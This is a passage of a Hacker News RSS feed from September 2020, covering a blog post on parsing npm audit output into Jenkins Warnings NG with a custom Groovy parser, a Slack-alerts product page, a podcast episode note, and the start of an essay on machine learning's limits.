‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ <span>Path</span>          ‚îÇ exceljs &gt; archiver &gt; tar-stream &gt; bl             ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ More <span>info</span>     ‚îÇ https://npmjs.com/advisories/<span>1555</span>                ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
</code></pre><p>Supposedly, you are using some CI server for your project (and you should use one). Now think about this:</p>
<blockquote>
<p>As your package manager automatically informs you about the vulnerabilities discovered in your dependencies, wouldn't it be awesome to receive this information on par with testing stats and linting reports on your CI server?</p>
</blockquote>
<p>In this blog post, I will walk you through the process of capturing your <code>npm audit</code> output during a Jenkins build and using it for up-to-date information, trend overview, and quality gates.</p>
<h2 id="the-scope">The Scope</h2>
<p>As you may have guessed already, we will talk about Jenkins here. If you are using another CI server, the <em>Understanding the NPM Format</em> section can be still useful for you, but everything else is indeed Jenkins-specific.</p>
<p>First of all, we are going to follow the <strong>declarative pipeline</strong> approach. It's a pity, that Jenkins still won't champion one of the approaches (at the moment Declarative Pipeline, Scripted Pipeline, and UI Config seem to be considered equally important). As the result, many libraries try to document how to use all the approaches, and as they don't have unlimited time, the documentations ends up being scarce. Based on extensive research I decided that Declarative Pipelines are the way to go, and I will stick to this decision throughout this blog.</p>
<p>Secondly, we are going to use the  <strong>Warnings Next Generation</strong>  plugin (a.k.a. <a target="_blank" href="https://plugins.jenkins.io/warnings-ng/">Warnings NG</a>). It seems to be the state of the art for static analysis reports at the moment. And yes, you need to have this plugin installed on your Jenkins server to get things working.</p>
<p>As the Warnings Next Generation plugin does not currently support the npm audit log format, we are going to overcome this issue by creating a <strong>custom groovy parser</strong>. There are other approaches like converting the output to a supported generic format or making a dedicated Jenkins plugin, and I may discuss these in the future. For now, the custom parser looks like the easiest way to get things going and all it requires are some changes to the build configuration.</p>
<p>Finally, I believe that even if your use case does not involve NPM, this blogpost can be useful for understanding how to implement custom groovy parsers for the Warnings GN plugin.</p>
<h2 id="understanding-the-npm-format">Understanding the NPM Format</h2>
<p>As you may imagine, ultimately we will have to parse the <code>npm audit</code> output into something understandable by Warnings NG. Although we are going to discuss the parser setup in the next section, I will spoil you by revealing that the passing uses regular expressions exclusively.</p>
<p>The example output that I shared in the intro contains a table built with ASCI symbols. Such a format is tough to parse with a regex. Luckily there is a flag <code>npm audit --parseable</code> which will write every violation as a single line with values separated by tabs (for the sake of readability I replaced the tabs with aligned spaces in the following snippet):</p>
<pre><code><span>update</span>   bl       <span>high</span>      npm <span>update</span> bl 
<span>install</span>  exceljs  moderate  npm <span>install</span> exceljs@<span>4.1</span><span>.1</span>    <span>Cross</span>-Site Scripting    https://npmjs.com/advisories/<span>733</span>   exceljs                                 Y
<span>update</span>   lodash   <span>low</span>       npm <span>update</span> lodash 
<span>update</span>   lodash   <span>low</span>       npm <span>update</span> lodash 
</code></pre><p>Each line contains the following information in order:</p>
<ol>
<li>Action type required to resolve the issue;</li>
<li>Name of the package with a vulnerability;</li>
<li>Severity of the vulnerability;</li>
<li>Resolution command/suggestion;</li>
<li>Vulnerability category;</li>
<li>Link to the vulnerability details;</li>
<li>Dependency path;</li>
<li>Y, N, or nothing. I don't know what that is :)</li>
</ol>
<p>To write the regex, I've googled a first good regex testing website (<a target="_blank" href="https://regexr.com/">regexr.com</a>), pasted the audit output, and experimented. In the following screenshot you can see from top to bottom:</p>
<ol>
<li>the resulting regex with a highlighted group that I'm investigating;</li>
<li>the example output I used for testing with one highlighted line that I'm investigating;</li>
<li>the breakdown of the match groups in the highlighted line, with one group highlighted which corresponds to the highlighted part of the regex.
<img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1600349954546/rr7FwAR_K.png?auto=format&amp;q=60" alt="Testing npm audit regex at regexr"></li>
</ol>
<p>As you could see, the resulting regex is:</p>
<p><code>\w+\t(\S+)\t(\w+)\t(\S| )+\t((\S| )+)\t(\S+)\t(\S+)</code></p>
<p>Here is a small explanation of important regex matching patterns:</p>
<ul>
<li><code>\t</code> ‚Äî a tab character;</li>
<li><code>\w</code> ‚Äî an alphanumerical character;</li>
<li><code>\S</code> ‚Äî a non-whitespace character;</li>
<li><code>(\S| )</code> ‚Äî a non-whitespace character or a space;</li>
<li><code>\w+</code> ‚Äî one or many alphanumerical characters;</li>
<li><code>\S+</code> ‚Äî one or many non-whitespace characters;</li>
<li><code>(\S| )+</code> ‚Äî one or many non-whitespace or space characters.</li>
</ul>
<p>You can (and should in this case) use parenthesis to define "capture groups." These are parts of the regex that can be accessed once a match is found. Sometimes you have to use parenthesis (as in <code>(\S| )+</code> to define that <code>+</code> applies to the whole "or" group). There are ways to ignore a certain parenthesis as a match group (so you can avoid pollution by necessary parenthesis) but we are not going to discuss this now.</p>
<p>Also the whole regex can be described as: <code>((\S| )+)\t</code> repeated eight times without the last <code>\t</code>. The whole line is composed of blocks of <em>one or many non-whitespace or space characters</em> followed by a tab. But I tried to be smart and use some simpler constructs where I was sure about the format of some parts.</p>
<h2 id="creating-a-custom-groovy-parser">Creating a Custom Groovy Parser</h2>
<p>At this point, we are going to jump directly into our Jenkins (declarative) pipeline. This assumes that we have a <code>Jenkinsfile</code> that describes a build pipeline composed of several stages. With my approach, all that you have to do is just to add one more stage for auditing. It will look the following way:</p>
<pre><code>stage(<span>'NPM Audit'</span>) {
    steps {
        script {
            // <span>set</span> up the <span>parser</span>
        }
        sh <span>'mkdir -p .tmp/npm'</span>
        sh <span>'npm audit --parseable &gt; .tmp/npm/audit || true'</span>
    }
    post {
        <span>always</span> {
            // <span>record</span> issues
        }
    }
}
</code></pre><p>We will spend the majority of this section to set up the parser, but let's take a quick look at the code that runs the auditing. First of all, don't forget to crate a temp directory where you are going to store the auditing log. Secondly, run the audit with the <code>--parseable</code> flag and write it into a temporary file with a unique name. As you can see, at the end of the command I have <code>|| true</code> which will ensure that the step will not fail. Normally when <code>npm audit</code> finds some vulnerabilities it exits with a non-zero code and thus fails the stage. I prefer to control how the stage fails with the quality gates of Warnings GN, and I will discuss this later. There is another option to specify the <code>--audit-level=critical</code> flag which will fail the step only if there are critical vulnerabilities (and probably you want to fail your build if you have one of those). Never the less, I prefer to handle all the vulnerabilities with Warnings GN. The downside of <code>|| true</code> is that the stage will not fail even if the <code>npm audit</code> command fails to run at all (e.g., if package.json is missing).</p>
<h3 id="defining-the-parser">Defining the Parser</h3>
<p>Based on the documentation, you should set up a parser with the following command:</p>
<pre><code><span><span>def</span> <span>config</span> = <span>io</span>.<span>jenkins</span>.<span>plugins</span>.<span>analysis</span>.<span>warnings</span>.<span>groovy</span>.<span>ParserConfiguration</span>.<span>getInstance</span><span>()</span></span>

<span>if</span>(!config.contains(<span>'npm-audit'</span>)){
    <span><span>def</span> <span>newParser</span> = <span>new</span> <span>io</span>.<span>jenkins</span>.<span>plugins</span>.<span>analysis</span>.<span>warnings</span>.<span>groovy</span>.<span>GroovyParser</span><span>(
        <span>'npm-audit'</span>,
        <span>'NPM Audit Parser'</span>,
        <span>'\w+\t(\S+)\t(\w+)\t(\S| )+\t((\S| )+)\t(\S+)\t(\S+)'</span>,
        <span>'return builder.setFileName(matcher.group(7)).setCategory(matcher.group(4)).setMessage(matcher.group(6)).buildOptional()'</span>,
        <span>"update\tlodash\tlow\tnpm update lodash --depth 9\tPrototype Pollution\thttps://npmjs.com/advisories/1523\telasticsearch&gt;lodash\tN"</span>
    )</span></span>
    config.setParsers(config.getParsers().plus(newParser))
}
</code></pre><p>Let's focus on the actual parser for now. We create a parser by calling the constructor of <code>GroovyParser</code>. The first two parameters are <code>id</code> and <code>name</code>. The <code>id</code> is a technical label used to identify your parser in the future, the <code>name</code> is what you are going to see in the Jenkins UI. Then comes the regex, which is identical to what we discussed in the previous section. The fourth parameter is the script which is going to create Warnings NG issues from the parsed out tokens, and the last one is the example line of what you are trying to parse (for documentation purposes).</p>
<p>Now let's look at the issue-building script in more detail. Essentially, you are using the issue builder API and passing the matched regex groups. To figure out the groups more easily, just look at the regex website again. Here is the list of all the building methods that we used:</p>
<ul>
<li><code>setFileName(matcher.group(7))</code> ‚Äî this literally sets the filename where the issue was found. Warnings NG will try to search for this file in your source code and will fail in our case (because we have packages and not actual files). Here I pass the package dependency path, so for each vulnerability, you have a clear notion of where it comes from. Another ‚Ä¶</li></ul></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://uko.codes/npm-audit-jenkins-warnings-next-generation-custom-groovy-parser">https://uko.codes/npm-audit-jenkins-warnings-next-generation-custom-groovy-parser</a></em></p>]]>
            </description>
            <link>https://uko.codes/npm-audit-jenkins-warnings-next-generation-custom-groovy-parser</link>
            <guid isPermaLink="false">hacker-news-small-sites-24520186</guid>
            <pubDate>Fri, 18 Sep 2020 18:25:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Slack alerts you wish GitHub had]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24519959">thread link</a>) | @doorknobguy
<br/>
September 18, 2020 | https://www.usehaystack.io/alerts | <a href="https://web.archive.org/web/*/https://www.usehaystack.io/alerts">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><main><div><div><div id="w-node-3dd9dc51e7f9-4c0d00e4" data-w-id="beac5ca5-6ed7-dda4-4aee-3dd9dc51e7f9"><p>Remove bottlenecks, optimize process, and work better together<br>with insights from your Github data.</p></div><p><img src="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5ef12b7c5ae6d57cd5e0d514_Throughput_with-notification.png" alt=""></p></div></div></main><main id="hero"><div><div><div id="w-node-5623c4fd5ab0-4c0d00e4" data-w-id="0380a09d-ce3b-2f17-c4ca-5623c4fd5ab0"><p>Slack notifications to help your team ship better code, faster.</p></div><div id="w-node-42b75419accf-4c0d00e4" data-w-id="7dc38662-535a-8ef4-513a-42b75419accf"><div data-animation="slide" data-duration="500" data-infinite="1"><div><p><img src="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f629ec18da8fb70f3d0260f_slack-daily-example.png" loading="lazy" srcset="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f629ec18da8fb70f3d0260f_slack-daily-example-p-500.png 500w, https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f629ec18da8fb70f3d0260f_slack-daily-example-p-800.png 800w, https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f629ec18da8fb70f3d0260f_slack-daily-example-p-1080.png 1080w, https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f629ec18da8fb70f3d0260f_slack-daily-example.png 1328w" sizes="(max-width: 479px) 78vw, (max-width: 767px) 81vw, (max-width: 1919px) 82vw, 1326px" alt=""></p><p><img src="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f6283b3d8dc7408ee64b9cb_slack-weekly-example.png" srcset="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f6283b3d8dc7408ee64b9cb_slack-weekly-example-p-500.png 500w, https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f6283b3d8dc7408ee64b9cb_slack-weekly-example-p-800.png 800w, https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f6283b3d8dc7408ee64b9cb_slack-weekly-example-p-1080.png 1080w, https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f6283b3d8dc7408ee64b9cb_slack-weekly-example.png 1328w" sizes="(max-width: 479px) 78vw, (max-width: 767px) 81vw, (max-width: 1919px) 82vw, 1326px" alt=""></p></div></div></div></div></div></main><section id="Features"><div><div id="w-node-0bb393705a91-4c0d00e4"><p>Spot bottlenecks, burnout, and 10x your review process.</p></div></div><header><div id="Feature-1"><div id="w-node-b744e92c040c-4c0d00e4"><p>REAL-TIME ALERTS</p><h2>Spot bottlenecks</h2><p>Resolve issues quickly and unblock your team. Spur meaningful conversations during the sprint instead of in the next retro.<br>‚Äç<br></p></div><p><img src="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f6297885edb9d6108dd6a71_spot-bottlenecks-alert.png" width="607" srcset="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f6297885edb9d6108dd6a71_spot-bottlenecks-alert-p-500.png 500w, https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f6297885edb9d6108dd6a71_spot-bottlenecks-alert-p-800.png 800w, https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f6297885edb9d6108dd6a71_spot-bottlenecks-alert.png 928w" sizes="(max-width: 767px) 100vw, (max-width: 1919px) 77vw, 1248px" id="w-node-b744e92c0422-4c0d00e4" alt=""></p></div></header><header><div id="Feature-2"><p><img src="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f63c4c22f203e475cd9fd88_slack-message-image.png" width="607" srcset="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f63c4c22f203e475cd9fd88_slack-message-image-p-500.png 500w, https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f63c4c22f203e475cd9fd88_slack-message-image-p-800.png 800w, https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f63c4c22f203e475cd9fd88_slack-message-image.png 928w" sizes="(max-width: 767px) 100vw, (max-width: 991px) 58vw, (max-width: 1919px) 77vw, 1248px" id="w-node-f6cddb11c0c8-4c0d00e4" alt=""></p><div id="w-node-f6cddb11c0b1-4c0d00e4"><p>HELPFUL NUDGES</p><h2>Encourage Best Practices</h2><div><p>Track process improvements and act quickly with real-time updates. No more guessing if your changes are working.</p></div></div></div></header><header><div id="Feature-3"><div id="w-node-e44b8362bb6c-4c0d00e4"><p>POWERFUL REMINDERS</p><h2>Stop Getting Stuck<br></h2><h2>'In Review'<br></h2><p>Keep your review process flowing with helpful alerts. Set reminders and notifications for when the team gets stuck.<a href="https://services.github.com/"><br></a><br></p></div><p><img src="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f6294e88a4808dd5a0833b2_improve-review-alerts.png" width="607" srcset="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f6294e88a4808dd5a0833b2_improve-review-alerts-p-500.png 500w, https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f6294e88a4808dd5a0833b2_improve-review-alerts-p-800.png 800w, https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f6294e88a4808dd5a0833b2_improve-review-alerts.png 928w" sizes="(max-width: 767px) 100vw, (max-width: 1919px) 77vw, 1248px" id="w-node-e44b8362bb83-4c0d00e4" alt=""></p></div></header></section><div><div data-w-id="1913e8fc-27d5-f2b4-033e-a7ad21644d4e"><p>Integrations</p><h2>Integrated with tools you already know and love.</h2></div></div><section id="Testimonials"><div><div><div><div data-w-id="92185803-4d8b-15a4-9568-5a8781084a54"><p>Our Clients</p><h2>Hear what our lovely clients say!<br></h2><p>Don‚Äôt take our word for it, take theirs.</p><p><a href="https://www.usehaystack.io/contact-us">Start Free Trial</a></p></div></div><div><div data-animation="slide" data-duration="500" data-infinite="1" data-w-id="92185803-4d8b-15a4-9568-5a8781084a5d"><div><div><div><div role="list"><div role="listitem"><div><p>‚ÄúI've tried just about every one of these tools and ended up choosing Haystack. Easy to use, no fluff and I love reading insights with my morning coffee‚Äù</p><div><p><img width="61" id="w-node-5a8781084a64-4c0d00e4" src="https://uploads-ssl.webflow.com/5ed57622ee14fb96d022d544/5f5ab21f5a5c1d05fa46cdee_jean-photo.jpeg" alt=""></p><div><p>Jean-Vicente De Carvalho</p><p>CTO at Lytehouse</p></div></div></div></div></div></div></div><div><div><div role="list"><div role="listitem"><div><p>‚ÄúAt first I was pretty skeptical these alerts would actually work. Since then we've found issues we never knew we had, resolved issues that we typically miss and the team has never felt so productive.‚Äù</p><div><p><img width="61" id="w-node-f94162db8587-4c0d00e4" src="https://uploads-ssl.webflow.com/5ed57622ee14fb96d022d544/5f5ab258d22639f82030c1da_joel-photo.jpeg" alt=""></p><div><p>Joel Spitalnik</p><p>VP of Engineering at IRIS.TV</p></div></div></div></div></div></div></div><div><div><div role="list"><div role="listitem"><div><p>"This is the product you thought of while reading Accelerate. We can experiment and make more changes - while knowing we're headed in the right direction"</p><div><p><img width="61" id="w-node-3f69e9154639-4c0d00e4" src="https://uploads-ssl.webflow.com/5ed57622ee14fb96d022d544/5f5abae65a5c1d706a46de5f_gady-pitaru.jpeg" alt=""></p><div><p>Gady Pitaru</p><p>CTO at Badger Maps</p></div></div></div></div></div></div></div><div><div><div role="list"><div role="listitem"><div><p>"Simple. Easy to use and lets you to dig in if you need to. No fluff metrics or 'big brother' reporting."</p><div><p><img width="61" id="w-node-94587b18d5aa-4c0d00e4" src="https://uploads-ssl.webflow.com/5ed57622ee14fb96d022d544/5f5ac46f360f449966fe3cb4_robert-hucik.jpeg" alt=""></p><div><p>Robert Hucik</p><p>SVP, Cloud Solutions at ForgeRock</p></div></div></div></div></div></div></div></div><p><img src="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5ed57622ee14fb89f722d550_arrow-left-saasy-template.svg" alt=""></p><p><img src="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5ed57622ee14fb7d7822d551_arrow-right-saasy-template.svg" alt=""></p></div><p><img src="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5ed57622ee14fbe09f22d536_background-pattern-bullets-saasy-template.svg" data-w-id="92185803-4d8b-15a4-9568-5a8781084a7b" alt=""></p></div></div></div></section><section><div><div><div data-w-id="c35d4237-391d-b7ac-d37d-be1394d7ce4a"><p>Mobile App</p><h2>Browse your analytics &amp; reports on the go!</h2><p>Browse all analytics reports, user profiles, and much more in our mobile app. It‚Äôs free, and full-feature packaged to help you on the go.</p><div><p><a href="https://www.apple.com/ios/app-store/"><img src="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5ed57622ee14fb051822d5c8_button-app-store-saasy-template.svg" alt=""></a></p><p><a href="https://play.google.com/store"><img src="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5ed57622ee14fb518f22d5c9_button-google-play-saasy-template.svg" alt=""></a></p></div></div><p><img src="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5ed57622ee14fb736d22d56c_mockup-saasy-template.png" srcset="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5ed57622ee14fb736d22d56c_mockup-saasy-template-p-500.png 500w, https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5ed57622ee14fb736d22d56c_mockup-saasy-template.png 1150w" sizes="100vw" data-w-id="e1c697c3-7ab8-9d09-98e0-f8be7cf200ed" alt=""></p></div></div></section><section id="FAQ"><div data-w-id="82ef7066-8d32-d493-5388-c4c2d2c5d587"><p>FAQs</p><h2>Frequently Asked Questions</h2><p>Have questions? We‚Äôve answers. If you can‚Äôt find what we are looking for, feel free to <a href="mailto:julian@usehaystack.io?subject=I%20have%20a%20question">get in touch</a>.</p></div><div><div><div data-w-id="3617354b-55d5-2b8b-9640-458190b21b06"><div data-delay="0" data-w-id="7708a86a-a613-5bc5-c125-ed8935e5b91c"><div><p>How does it work?</p><p><img src="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5ed57622ee14fb349622d53a_plus-icon-saasy-template.svg" alt=""></p></div><nav><p>Haystack plugs directly into your repositories using the Github API. We analyze the past 6 months of historical data to determine 'healthy area' for each team, repository, and member. Our system compares incoming activity to success heuristics we've collected over the years so things look out of the ordinary or worth noting - we'll tell you about. Simple as that.</p></nav></div><div data-delay="0" data-w-id="ff73c91b-7b6b-02ad-ffcb-97993103d63c"><div><p>How do I&nbsp;set it up?</p><p><img src="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5ed57622ee14fb349622d53a_plus-icon-saasy-template.svg" alt=""></p></div><nav><p>1. Create a Haystack Account<br>2. Install our Github App<br>3. Choose which repositories to plug into Haystack<br>4. Sit back and relax while insights roll into your inbox</p></nav></div><div data-delay="0" data-w-id="29e7d9a4-79c8-dee3-b804-7ae25b5c1a6d"><div><p>Do you have a demo?</p><p><img src="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5ed57622ee14fb349622d53a_plus-icon-saasy-template.svg" alt=""></p></div><nav><p>We don't have a live demo to share at the moment. With that said, we'd be happy to walk you through our own team's internal dashboard. Just email us at sales@usehaystack.io and we'll show you how it works!</p></nav></div><div data-delay="0" data-w-id="c403712e-e2f6-bb93-d607-e35a8eec7460"><div><p>Is it secure?</p><p><img src="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5ed57622ee14fb349622d53a_plus-icon-saasy-template.svg" alt=""></p></div><nav><p>Haystack does not store, read or access any of your source code. We simply use the timestamps and metadata on pull requests so your code is safe.</p></nav></div><div data-delay="0" data-w-id="ce364f13-3101-3764-a412-acdc61fe8df0"><div><p>Does it work with BitBucket or Gitlab?</p><p><img src="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5ed57622ee14fb349622d53a_plus-icon-saasy-template.svg" alt=""></p></div><nav><p>Haystack is built to support all version control platforms but at the moment we have a waitlist for Gitlab and Bitbucket users. On-premise solutions are supported with our Enterprise plan and if you need a custom integration just let us know at sales@usehaystack.io</p></nav></div></div></div></div></section><div><div data-w-id="a3e18c38-b5e1-16c3-1f84-aa2f003da28c"><p>Integrations</p><h2>Integrated with tools you already know and love.</h2></div></div><section></section></div></div>]]>
            </description>
            <link>https://www.usehaystack.io/alerts</link>
            <guid isPermaLink="false">hacker-news-small-sites-24519959</guid>
            <pubDate>Fri, 18 Sep 2020 18:05:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[‚ÄúI almost died twice..‚Äù, a conversation with Weedmaps developer Kent Kawahara]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24519925">thread link</a>) | @stackyacker
<br/>
September 18, 2020 | https://stackyack.tv/post/stack-yack-015-talking-shop-with-kent-kawahara | <a href="https://web.archive.org/web/*/https://stackyack.tv/post/stack-yack-015-talking-shop-with-kent-kawahara">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><header><svg width="250" height="28" viewBox="0 0 250 28" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M4 10.0405C47.449 10.0405 90.7725 7.64212 134.135 6.12911C168.179 4.94125 202.779 6.98535 236.657 4.27458C238.06 4.16231 249.568 3.69847 242.978 4.3083C222.385 6.21398 201.778 8.15799 181.043 9.39982C139.422 11.8926 97.5315 11.4142 55.8987 13.7158C52.5174 13.9027 49.4931 14.289 46.0291 14.289C19.2952 14.289 99.4723 15.4441 126.206 15.5029C148.996 15.553 171.002 14.9327 193.63 13.817C204.771 13.2676 181.518 14.9943 179.768 15.0308C160.98 15.4233 141.617 14.7726 122.99 16.447C115.197 17.1476 133.942 17.7196 135.632 17.7958C139.117 17.9528 144.692 17.7667 147.83 18.8748C151.656 20.2257 139.112 19.7946 134.745 20.2235C128.945 20.7931 123.956 21.4568 119.774 24" stroke="#FF0000" stroke-width="8" stroke-linecap="round" stroke-linejoin="round"></path></svg><b>Fri Sep 18 2020</b></header><p><iframe src="https://www.youtube.com/embed/AnPLM5o45cg" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p><div><p>Hello, world! Thanks for tuning into the 15th edition of Stack Yack. </p><p>15 weeks strong here folks. When I first started SY, my biggest concern was how the hell am I going to create new content every week?! Surprisingly, it's hasn't been too hard. In fact, I've been a making content 1-2 weeks ahead of schedule now. Anyway, just tooting my own horn here a bit and how stoked I am about SY. </p><p>Side note - I'm definitely looking for help on how to grow it across various social channels, so if you are able to help or know someone who can, please reach out to christianlovescode@gmail.com :) </p><p>Okay, let's get into it. </p><p>This week (or last week rather), I caught up with Kent K - Senior SWE and former colleague of mine at Weedmaps, in Irvine, CA. We dive into what it's like to work at Weedmaps, how it's changed since COVID, pair programming, learning to code, how he almost died twice and his insanely useful app to help prevent that, staying healthy, and much much more. </p><p>This is a rather long episode, but lots of good nugs&nbsp;üòâ along the way you'll find valuable. </p><p>As always thanks for tuning in, and I'm super grateful to have you as a Stack Yack supporter. </p><p>Enjoy the weekend! Christian</p></div><p>Thanks for tuning in,</p></article></div>]]>
            </description>
            <link>https://stackyack.tv/post/stack-yack-015-talking-shop-with-kent-kawahara</link>
            <guid isPermaLink="false">hacker-news-small-sites-24519925</guid>
            <pubDate>Fri, 18 Sep 2020 18:02:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why some artificial intelligence is smart until it‚Äôs dumb]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24519726">thread link</a>) | @sinapticasblog
<br/>
September 18, 2020 | https://sinapticas.com/2020/09/18/why-some-artificial-intelligence-is-smart-until-its-dumb/ | <a href="https://web.archive.org/web/*/https://sinapticas.com/2020/09/18/why-some-artificial-intelligence-is-smart-until-its-dumb/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p><em><strong>Cover image: Xavier Cortada ‚Äì ‚ÄúIn search of the Higgs boson‚Äù</strong></em></p>



<p>Machine learning has found uses in fields as diverse as particle physics and radiology, and its influence is growing. But so is the understanding of its limits.</p>



<p>By Tom Siegfried</p>



<p>8.27.2020</p>



<p>It‚Äôs Stardate 47025.4, in the 24th century. Starfleet‚Äôs star android, Lt. Commander Data, has been enlisted by his renegade android ‚Äúbrother‚Äù Lore to join a rebellion against humankind ‚Äî much to the consternation of Jean-Luc Picard, captain of the USS Enterprise. ‚ÄúThe reign of biological life-forms is coming to an end,‚Äù Lore tells Picard. ‚ÄúYou, Picard, and those like you, are obsolete.‚Äù</p>



<p>That‚Äôs <em>Star Trek</em> for you ‚Äî so optimistic that machines won‚Äôt dethrone humans until at least three more centuries. But that‚Äôs fiction. In real life, the era of smart machines has already arrived. They haven‚Äôt completely taken over the world yet, but they‚Äôre off to a good start.</p>



<p>‚ÄúMachine learning‚Äù ‚Äî a sort of concrete subfield within the more nebulous quest for artificial intelligence ‚Äî has invaded numerous fields of human endeavor, from medical diagnosis to searching for new subatomic particles. Thanks to its most powerful incarnation ‚Äî known as deep learning ‚Äî machine learning‚Äôs repertoire of skills now includes recognizing speech, translating languages, identifying images, driving cars, designing new materials and predicting trends in the stock market, among uses in many arenas.</p>



<p>‚ÄúBecause computers can effortlessly sift through data at scales far beyond human capabilities, deep learning is not only about to transform modern society, but also about to revolutionize science ‚Äî crossing major disciplines from particle physics and organic chemistry to biological research and biomedical applications,‚Äù computational neuroscientist Thomas Serre wrote in the 2019 <a href="https://www.annualreviews.org/doi/10.1146/annurev-vision-091718-014951" target="_blank" rel="noreferrer noopener"><em>Annual Review of Vision Science</em></a>.</p>



<p>A proliferation of new papers on machine learning, deep learning and artificial intelligence have flooded the scientific literature in recent years. Reviews of this new research have covered such topics as health care and epidemiology, materials science, fundamental physics, quantum computing, simulations of molecular interactions, fluid mechanics, clinical psychology, economics, vision science and drug discovery.</p>



